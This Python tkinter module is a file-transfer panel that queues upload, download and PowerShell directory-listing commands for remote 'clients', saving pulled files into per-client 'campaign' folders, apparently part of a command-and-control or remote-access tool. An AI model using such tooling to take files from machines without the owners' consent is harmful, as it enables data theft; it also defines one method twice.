import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os
import datetime
import json
import base64

class ClientFilesUI:
    """Handles the UI components for file upload and download management"""
    
    def __init__(self, parent_frame, client_id, client_manager, logger):
        """
        Initialize the file management UI
        
        Args:
            parent_frame: The parent frame widget
            client_id: The unique identifier for the client
            client_manager: The client manager instance
            logger: Function for logging events
        """
        self.parent_frame = parent_frame
        self.client_id = client_id
        self.client_manager = client_manager
        self.logger = logger
        self.uploaded_files = {}  # Store file info for uploads from server to client
        self.downloaded_files = {}  # Store file info for downloads from client to server
        
        # Create the UI components
        self.create_widgets()
        
        # Register callbacks for updates
        self.client_manager.register_command_update_callback(client_id, self.update_file_status)
        
        # Initial refresh
        self.refresh_files_list()
    
    def create_widgets(self):
        """Create the widgets for the file management UI"""
        # Main container
        self.main_frame = ttk.Frame(self.parent_frame)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a paned window to separate upload and download sections
        self.paned_window = ttk.PanedWindow(self.main_frame, orient=tk.VERTICAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Upload section (server to client)
        self.upload_frame = ttk.LabelFrame(self.paned_window, text="Upload Files to Client")
        
        # Download section (client to server)
        self.download_frame = ttk.LabelFrame(self.paned_window, text="Download Files from Client")
        
        # Add frames to paned window
        self.paned_window.add(self.upload_frame, weight=1)
        self.paned_window.add(self.download_frame, weight=1)
        
        # === UPLOAD SECTION (Server to Client) ===
        upload_control_frame = ttk.Frame(self.upload_frame)
        upload_control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(upload_control_frame, text="Local File:").pack(side=tk.LEFT, padx=5)
        self.upload_file_path = ttk.Entry(upload_control_frame, width=40)
        self.upload_file_path.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        ttk.Button(upload_control_frame, text="Browse", 
                  command=self.browse_local_file).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(upload_control_frame, text="Upload to Client", 
                  command=self.upload_file_to_client).pack(side=tk.LEFT, padx=5)
        
        # Upload history
        upload_history_frame = ttk.Frame(self.upload_frame)
        upload_history_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(upload_history_frame, text="Upload History:").pack(anchor=tk.W, padx=5, pady=2)
        
        # Treeview for upload history
        columns = ("Timestamp", "Filename", "Size", "Status")
        self.upload_tree = ttk.Treeview(upload_history_frame, columns=columns, show="headings", height=5)
        
        self.upload_tree.heading("Timestamp", text="Timestamp")
        self.upload_tree.heading("Filename", text="Filename")
        self.upload_tree.heading("Size", text="Size")
        self.upload_tree.heading("Status", text="Status")
        
        # Configure column widths
        self.upload_tree.column("Timestamp", width=150)
        self.upload_tree.column("Filename", width=200)
        self.upload_tree.column("Size", width=100)
        self.upload_tree.column("Status", width=100)
        
        # Add scrollbar for upload tree
        upload_scrollbar = ttk.Scrollbar(upload_history_frame, orient="vertical", command=self.upload_tree.yview)
        self.upload_tree.configure(yscrollcommand=upload_scrollbar.set)
        
        # Pack tree and scrollbar
        self.upload_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        upload_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # === DOWNLOAD SECTION (Client to Server) ===
        download_control_frame = ttk.Frame(self.download_frame)
        download_control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(download_control_frame, text="Remote File Path:").pack(side=tk.LEFT, padx=5)
        self.remote_file_path = ttk.Entry(download_control_frame, width=40)
        self.remote_file_path.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        ttk.Button(download_control_frame, text="Download from Client", 
                  command=self.download_file_from_client).pack(side=tk.LEFT, padx=5)
        
        # Remote file browsing
        browse_remote_frame = ttk.Frame(self.download_frame)
        browse_remote_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(browse_remote_frame, text="List Common Directories", 
                  command=self.list_common_directories).pack(side=tk.LEFT, padx=5)
        
        remote_dir_combo_values = ["C:\\Users\\Public\\Documents", "C:\\Windows\\Temp", "%USERPROFILE%\\Downloads", 
                                  "%USERPROFILE%\\Desktop", "%USERPROFILE%\\Documents"]
        self.remote_dir_combo = ttk.Combobox(browse_remote_frame, values=remote_dir_combo_values, width=30)
        self.remote_dir_combo.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.remote_dir_combo.bind("<<ComboboxSelected>>", self.on_remote_dir_selected)
        
        ttk.Button(browse_remote_frame, text="Browse Directory", 
                  command=lambda: self.download_directory_listing(self.remote_dir_combo.get())).pack(side=tk.LEFT, padx=5)
        
        # Download history
        download_history_frame = ttk.Frame(self.download_frame)
        download_history_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(download_history_frame, text="Download History:").pack(anchor=tk.W, padx=5, pady=2)
        
        # Treeview for download history
        columns = ("Timestamp", "Remote Path", "Local Path", "Size", "Status")
        self.download_tree = ttk.Treeview(download_history_frame, columns=columns, show="headings", height=5)
        
        self.download_tree.heading("Timestamp", text="Timestamp")
        self.download_tree.heading("Remote Path", text="Remote Path")
        self.download_tree.heading("Local Path", text="Local Path")
        self.download_tree.heading("Size", text="Size")
        self.download_tree.heading("Status", text="Status")
        
        # Configure column widths
        self.download_tree.column("Timestamp", width=150)
        self.download_tree.column("Remote Path", width=200)
        self.download_tree.column("Local Path", width=200)
        self.download_tree.column("Size", width=100)
        self.download_tree.column("Status", width=100)
        
        # Add scrollbar for download tree
        download_scrollbar = ttk.Scrollbar(download_history_frame, orient="vertical", command=self.download_tree.yview)
        self.download_tree.configure(yscrollcommand=download_scrollbar.set)
        
        # Pack tree and scrollbar
        self.download_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        download_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # File preview area
        preview_frame = ttk.LabelFrame(self.main_frame, text="File Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.preview_text = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD, height=8)
        self.preview_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Bind selection events to display file info
        self.download_tree.bind("<<TreeviewSelect>>", self.on_download_select)
        self.upload_tree.bind("<<TreeviewSelect>>", self.on_upload_select)
        
        # Control buttons at the bottom
        control_frame = ttk.Frame(self.main_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(control_frame, text="Refresh", command=self.refresh_files_list).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Open Downloads Folder", command=self.open_downloads_folder).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Clear History", command=self.clear_history).pack(side=tk.LEFT, padx=5)
    
    def browse_local_file(self):
        """Open file dialog to select a local file to upload"""
        file_path = filedialog.askopenfilename(title="Select File to Upload")
        if file_path:
            self.upload_file_path.delete(0, tk.END)
            self.upload_file_path.insert(0, file_path)
    
    def upload_file_to_client(self):
        """Upload a file from the local machine to the client"""
        local_file_path = self.upload_file_path.get().strip()
        
        if not local_file_path:
            messagebox.showerror("Error", "Please select a file to upload")
            return
        
        if not os.path.exists(local_file_path):
            messagebox.showerror("Error", "File does not exist")
            return
        
        # Generate a reasonable destination path
        filename = os.path.basename(local_file_path)
        destination = f"%TEMP%\\{filename}"  # Default to temp directory
        
        # Get file size for display
        file_size = os.path.getsize(local_file_path)
        file_size_str = self.format_file_size(file_size)
        
        # Create command to upload the file
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        command_args = f"Upload-File '{local_file_path}' '{destination}'"
        
        # Add command to client manager
        self.client_manager.add_command(self.client_id, "file_upload", command_args)
        
        # Add to upload history
        upload_id = f"upload_{timestamp}"
        self.uploaded_files[upload_id] = {
            "timestamp": timestamp,
            "local_path": local_file_path,
            "remote_path": destination,
            "filename": filename,
            "size": file_size_str,
            "status": "Pending"
        }
        
        # Update the tree
        self.update_upload_tree()
        
        # Log the upload
        self.logger(f"File upload initiated: {local_file_path} to {self.client_id}:{destination}")
    
    def download_file_from_client(self):
        """Download a file from the client to the local machine"""
        remote_path = self.remote_file_path.get().strip()
        
        if not remote_path:
            messagebox.showerror("Error", "Please enter a remote file path")
            return
        
        # Create a folder for downloads if it doesn't exist
        downloads_folder = self.get_downloads_folder()
        
        # Create command to download the file
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Send the download command
        command_args = f"{remote_path}"
        self.client_manager.add_command(self.client_id, "download", command_args)
        
        # Add to download history
        download_id = f"download_{timestamp}"
        filename = os.path.basename(remote_path)
        local_path = os.path.join(downloads_folder, filename)
        
        self.downloaded_files[download_id] = {
            "timestamp": timestamp,
            "remote_path": remote_path,
            "local_path": local_path,
            "filename": filename,
            "size": "Pending",
            "status": "Pending"
        }
        
        # Update the tree
        self.update_download_tree()
        
        # Log the download
        self.logger(f"File download initiated: {self.client_id}:{remote_path} to {local_path}")
    
    def download_directory_listing(self, directory):
        """Get a directory listing from the client"""
        if not directory:
            messagebox.showerror("Error", "Please enter a directory path")
            return
        
        # Expand environment variables if needed
        if directory.startswith("%"):
            # This will be expanded on the client side, just make it clear in the UI
            display_dir = directory
        else:
            display_dir = directory
        
        # Create command to list directory contents
        command_args = f"Get-ChildItem -Path '{directory}' | Select-Object Name, Length, LastWriteTime, Attributes | ConvertTo-Json"
        self.client_manager.add_command(self.client_id, "execute", command_args)
        
        # Set the preview text
        self.preview_text.delete(1.0, tk.END)
        self.preview_text.insert(tk.END, f"Getting directory listing for {display_dir}...\n")
        
        # Log the request
        self.logger(f"Requesting directory listing: {self.client_id}:{display_dir}")
    
    def list_common_directories(self):
        """Display a list of common directories in the preview pane"""
        common_dirs = [
            "C:\\Users\\Public\\Documents",
            "C:\\Windows\\Temp",
            "%USERPROFILE%\\Downloads",
            "%USERPROFILE%\\Desktop",
            "%USERPROFILE%\\Documents",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "%APPDATA%",
            "%LOCALAPPDATA%",
            "C:\\ProgramData"
        ]
        
        self.preview_text.delete(1.0, tk.END)
        self.preview_text.insert(tk.END, "Common Windows Directories:\n\n")
        
        for directory in common_dirs:
            self.preview_text.insert(tk.END, f"• {directory}\n")
        
        self.preview_text.insert(tk.END, "\nSelect one from the dropdown or enter a custom path.")
    
    def on_remote_dir_selected(self, event):
        """Handle selection of a remote directory from the dropdown"""
        selected_dir = self.remote_dir_combo.get()
        if selected_dir:
            # Auto-fill the remote file path field as a starting point
            self.remote_file_path.delete(0, tk.END)
            self.remote_file_path.insert(0, selected_dir)
            
            # Automatically request a directory listing
            self.download_directory_listing(selected_dir)
    
    def update_file_status(self):
        """Update the status of file transfers based on command results"""
        # Get client history
        history = self.client_manager.get_client_history(self.client_id)
        
        for command in history:
            if 'result' in command:
                timestamp = command.get('timestamp', '')
                command_type = command.get('command_type', '')
                args = command.get('args', '')
                result = command.get('result', '')
                
                # Handle download commands
                if command_type == "download" and timestamp:
                    download_id = f"download_{timestamp}"
                    if download_id in self.downloaded_files:
                        download_info = self.downloaded_files[download_id]
                        
                        # Check if result indicates success
                        if "Downloaded" in result or "bytes saved" in result:
                            download_info["status"] = "Completed"
                            
                            # Try to extract file size if provided
                            if "bytes" in result:
                                try:
                                    size_str = result.split("bytes")[0].strip().split(" ")[-1]
                                    size = int(size_str)
                                    download_info["size"] = self.format_file_size(size)
                                except:
                                    download_info["size"] = "Unknown"
                        elif "Error" in result or "failed" in result:
                            download_info["status"] = "Failed"
                            download_info["error"] = result
                
                # Handle file upload commands
                elif command_type == "file_upload" and timestamp:
                    upload_id = f"upload_{timestamp}"
                    if upload_id in self.uploaded_files:
                        upload_info = self.uploaded_files[upload_id]
                        
                        # Check if result indicates success
                        if "successfully" in result or "uploaded" in result:
                            upload_info["status"] = "Completed"
                        elif "Error" in result or "failed" in result:
                            upload_info["status"] = "Failed"
                            upload_info["error"] = result
                
                # Handle directory listing results
                elif command_type == "execute" and "Get-ChildItem" in args:
                    try:
                        # Try to parse JSON output of Get-ChildItem
                        dir_listing = json.loads(result)
                        
                        # Format for display in preview
                        self.display_directory_listing(dir_listing, args)
                    except json.JSONDecodeError:
                        # If not valid JSON, just show the raw result
                        self.preview_text.delete(1.0, tk.END)
                        self.preview_text.insert(tk.END, f"Directory Listing Results:\n\n{result}")
        
        # Update the UI
        self.update_upload_tree()
        self.update_download_tree()
    
    def display_directory_listing(self, listing, command):
        """Display a formatted directory listing in the preview text area"""
        # Extract directory path from command
        directory = command.split("'")[1] if "'" in command else "Unknown"
        
        self.preview_text.delete(1.0, tk.END)
        self.preview_text.insert(tk.END, f"Directory Listing for: {directory}\n\n")
        
        # If the result is a single object, convert to list
        if isinstance(listing, dict):
            listing = [listing]
        
        # Create table header
        header = f"{'Name':<40} {'Size':<12} {'Last Modified':<20} {'Attributes':<15}\n"
        self.preview_text.insert(tk.END, header)
        self.preview_text.insert(tk.END, "-" * 90 + "\n")
        
        # Process each item
        for item in listing:
            try:
                name = item.get('Name', 'Unknown')
                size = item.get('Length', 0)
                size_str = self.format_file_size(size) if size else 'Directory'
                
                # Convert .NET date format if needed
                last_write = item.get('LastWriteTime', '')
                if isinstance(last_write, dict) and 'DateTime' in last_write:
                    last_write = last_write['DateTime']
                
                attrs = item.get('Attributes', '')
                
                # Format as a table row
                row = f"{name:<40} {size_str:<12} {last_write:<20} {attrs:<15}\n"
                self.preview_text.insert(tk.END, row)
                
                # Add a context menu option to quickly download this file
                if size > 0:  # Only for files, not directories
                    full_path = os.path.join(directory, name)
                    full_path = full_path.replace('\\\\', '\\')  # Normalize path
                    
                    # Add double-click handler?
                    # TODO: Implement if needed
            except Exception as e:
                self.logger(f"Error processing directory item: {e}")
        
        # Add instructions
        self.preview_text.insert(tk.END, "\n\nTo download a file, copy its full path to the 'Remote File Path' field and click 'Download from Client'.")
        
        # Make it easy to use these results
        path_option = os.path.join(directory, "[filename]")
        path_option = path_option.replace('\\\\', '\\')  # Normalize path
        self.remote_file_path.delete(0, tk.END)
        self.remote_file_path.insert(0, path_option)
    
    def update_upload_tree(self):
        """Update the upload history treeview"""
        # Clear current items
        for item in self.upload_tree.get_children():
            self.upload_tree.delete(item)
        
        # Add uploads in reverse chronological order
        for upload_id, info in sorted(self.uploaded_files.items(), key=lambda x: x[1]["timestamp"], reverse=True):
            status = info["status"]
            self.upload_tree.insert("", tk.END, iid=upload_id, values=(
                info["timestamp"],
                info["filename"],
                info["size"],
                status
            ), tags=(status.lower(),))
        
        # Configure tag colors
        self.upload_tree.tag_configure("completed", background="#E0FFE0")  # Light green
        self.upload_tree.tag_configure("pending", background="#FFFFD0")    # Light yellow
        self.upload_tree.tag_configure("failed", background="#FFE0E0")     # Light red
    
    def update_download_tree(self):
        """Update the download history treeview"""
        # Clear current items
        for item in self.download_tree.get_children():
            self.download_tree.delete(item)
        
        # Add downloads in reverse chronological order
        for download_id, info in sorted(self.downloaded_files.items(), key=lambda x: x[1]["timestamp"], reverse=True):
            status = info["status"]
            self.download_tree.insert("", tk.END, iid=download_id, values=(
                info["timestamp"],
                info["remote_path"],
                info["local_path"],
                info["size"],
                status
            ), tags=(status.lower(),))
        
        # Configure tag colors
        self.download_tree.tag_configure("completed", background="#E0FFE0")  # Light green
        self.download_tree.tag_configure("pending", background="#FFFFD0")    # Light yellow
        self.download_tree.tag_configure("failed", background="#FFE0E0")     # Light red
    
    def on_upload_select(self, event):
        """Handle selection of an upload in the tree"""
        selected = self.upload_tree.selection()
        if not selected:
            return
        
        upload_id = selected[0]
        if upload_id in self.uploaded_files:
            info = self.uploaded_files[upload_id]
            
            # Display info in preview
            self.preview_text.delete(1.0, tk.END)
            self.preview_text.insert(tk.END, f"Upload Details\n\n")
            self.preview_text.insert(tk.END, f"Filename: {info['filename']}\n")
            self.preview_text.insert(tk.END, f"Local Path: {info['local_path']}\n")
            self.preview_text.insert(tk.END, f"Remote Path: {info['remote_path']}\n")
            self.preview_text.insert(tk.END, f"Size: {info['size']}\n")
            self.preview_text.insert(tk.END, f"Status: {info['status']}\n")
            self.preview_text.insert(tk.END, f"Timestamp: {info['timestamp']}\n")
            
            if "error" in info:
                self.preview_text.insert(tk.END, f"\nError: {info['error']}\n")
    
    def on_download_select(self, event):
        """Handle selection of a download in the tree"""
        selected = self.download_tree.selection()
        if not selected:
            return
        
        download_id = selected[0]
        if download_id in self.downloaded_files:
            info = self.downloaded_files[download_id]
            
            # Display info in preview
            self.preview_text.delete(1.0, tk.END)
            self.preview_text.insert(tk.END, f"Download Details\n\n")
            self.preview_text.insert(tk.END, f"Remote Path: {info['remote_path']}\n")
            self.preview_text.insert(tk.END, f"Local Path: {info['local_path']}\n")
            self.preview_text.insert(tk.END, f"Size: {info['size']}\n")
            self.preview_text.insert(tk.END, f"Status: {info['status']}\n")
            self.preview_text.insert(tk.END, f"Timestamp: {info['timestamp']}\n")
            
            if "error" in info:
                self.preview_text.insert(tk.END, f"\nError: {info['error']}\n")
            
            if info["status"] == "Completed":
                self.preview_text.insert(tk.END, f"\nFile saved to: {info['local_path']}\n")
                self.preview_text.insert(tk.END, f"Click 'Open Downloads Folder' to access the file.")
    
    def get_downloads_folder(self):
        """Get the path to the downloads folder for this client"""
        # Create a folder structure: campaign_folder/downloads/client_id
        campaign_dir = self.get_campaign_folder()
        client_downloads = os.path.join(campaign_dir, "downloads", self.client_id)
        os.makedirs(client_downloads, exist_ok=True)
        return client_downloads
    
    def get_campaign_folder(self):
        """Get the current campaign folder path"""
        # Try to determine the campaign folder from client info
        client_info = self.client_manager.get_clients_info().get(self.client_id, {})
        if 'campaign_folder' in client_info:
            return client_info['campaign_folder']
        
        # Otherwise, look for campaign_name*_campaign directories
        for folder in os.listdir():
            if folder.endswith("_campaign") and os.path.isdir(folder):
                return folder
        
        # Fallback to a default
        return "default_campaign"
    
    def open_downloads_folder(self):
        """Open the downloads folder in file explorer"""
        download_folder = self.get_downloads_folder()
        
        if not os.path.exists(download_folder):
            messagebox.showerror("Error", f"Downloads folder does not exist: {download_folder}")
            return
        
        # Open the folder using the appropriate command for the platform
        import subprocess
        import platform
        
        system = platform.system()
        try:
            if system == "Windows":
                os.startfile(download_folder)
            elif system == "Darwin":  # macOS
                subprocess.run(["open", download_folder])
            else:  # Linux and others
                subprocess.run(["xdg-open", download_folder])
        except Exception as e:
            messagebox.showerror("Error", f"Failed to open downloads folder: {str(e)}")
    
    def clear_history(self):
        """Clear the file transfer history"""
        result = messagebox.askyesno("Confirm", "Are you sure you want to clear all file transfer history?")
        if result:
            self.uploaded_files = {}
            self.downloaded_files = {}
            self.update_upload_tree()
            self.update_download_tree()
            self.preview_text.delete(1.0, tk.END)
    
    def refresh_files_list(self):
        """Refresh the file transfer history and update UI"""
        # Update trees
        self.update_upload_tree()
        self.update_download_tree()
        
        # Look for new uploads/downloads in client history
        self.update_file_status()
    
    @staticmethod
    def format_file_size(size_bytes):
        """Format file size in a human-readable format"""
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.1f} KB"
        elif size_bytes < 1024 * 1024 * 1024:
            return f"{size_bytes / (1024 * 1024):.1f} MB"
        else:
            return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"
        
    def update_file_status(self):
        """Update the status of file transfers based on command results"""
        # Get client history
        history = self.client_manager.get_client_history(self.client_id)
        
        for command in history:
            timestamp = command.get('timestamp', '')
            command_type = command.get('command_type', '')
            args = command.get('args', '')
            
            # Check if the command has a result
            if 'result' in command:
                result = command.get('result', '')
                
                # Process file_upload commands
                if command_type == "file_upload" and "Upload-File" in args:
                    # Extract paths from args
                    parts = args.replace("Upload-File ", "").strip()
                    if "' '" in parts:
                        server_path, client_path = parts.split("' '", 1)
                        server_path = server_path.strip("'")
                        client_path = client_path.strip("'")
                        
                        upload_id = f"upload_{timestamp}"
                        
                        # Add to uploads if not already there
                        if upload_id not in self.uploaded_files:
                            file_size = "Unknown"
                            try:
                                if os.path.exists(server_path):
                                    file_size = self.format_file_size(os.path.getsize(server_path))
                            except:
                                pass
                                
                            self.uploaded_files[upload_id] = {
                                "timestamp": timestamp,
                                "local_path": server_path,
                                "remote_path": client_path,
                                "filename": os.path.basename(server_path),
                                "size": file_size,
                                "status": "Pending"
                            }
                        
                        # Update status based on result
                        if "successfully" in result or "upload" in result:
                            self.uploaded_files[upload_id]["status"] = "Completed"
                        elif "Error" in result or "failed" in result:
                            self.uploaded_files[upload_id]["status"] = "Failed"
                            self.uploaded_files[upload_id]["error"] = result
                
                # Process download commands
                elif command_type == "download":
                    download_id = f"download_{timestamp}"
                    if download_id in self.downloaded_files:
                        download_info = self.downloaded_files[download_id]
                        
                        # Check if result indicates success
                        if "bytes" in result or "downloaded" in result or "from" in result:
                            download_info["status"] = "Completed"
                            
                            # Try to extract file size if provided
                            if "bytes" in result:
                                try:
                                    size_str = result.split("bytes")[0].strip().split(" ")[-1]
                                    size = int(size_str)
                                    download_info["size"] = self.format_file_size(size)
                                except:
                                    download_info["size"] = "Unknown"
                        elif "Error" in result or "failed" in result:
                            download_info["status"] = "Failed"
                            download_info["error"] = result
                            
        # Update the UI
        self.update_upload_tree()
        self.update_download_tree()